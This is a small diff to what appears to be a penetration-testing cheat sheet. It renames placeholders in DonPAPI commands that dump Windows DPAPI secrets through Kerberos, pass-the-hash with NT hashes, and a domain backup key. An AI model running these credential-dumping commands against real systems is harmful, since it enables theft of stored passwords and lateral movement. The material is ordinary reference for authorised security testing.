@@ -31,12 +31,12 @@ DonPAPI --hashes :<NT> <target>/<user>@<target>
 
 ## Dump all secrets (kerberos)
 ```
-DonPAPI -k <domain>/<user>@<target>
+DonPAPI -k <domain_fqdn>/<user>@<target>
 ```
 
 
 ## DonPAPI - Dump all secrets with Domain Admin and PVK (pth)
 run dpapi.py to get PVK
 ```
-DonPAPI -pvk <pvk_path> -o <out_path> --hashes <LM>:<NT> <domain>/<user>@<target>
+DonPAPI -pvk <pvk_path> -o <out_path> --hashes <LM>:<NT> <domain_fqdn>/<user>@<target>
 ```
